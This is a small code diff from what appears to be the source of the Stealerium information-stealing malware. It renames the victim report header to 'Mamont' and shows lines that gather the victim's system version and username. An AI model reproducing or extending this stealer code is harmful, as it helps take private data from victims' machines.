@@ -182,7 +182,7 @@ namespace Stealerium
 
             // Get info
             var info = "```"
-                       + "\n😹 *Stealerium - Report:*"
+                       + "\n😹 *Mamont - Report:*"
                        + "\nDate: " + SystemInfo.Datenow
                        + "\nSystem: " + SystemInfo.GetSystemVersion()
                        + "\nUsername: " + SystemInfo.Username
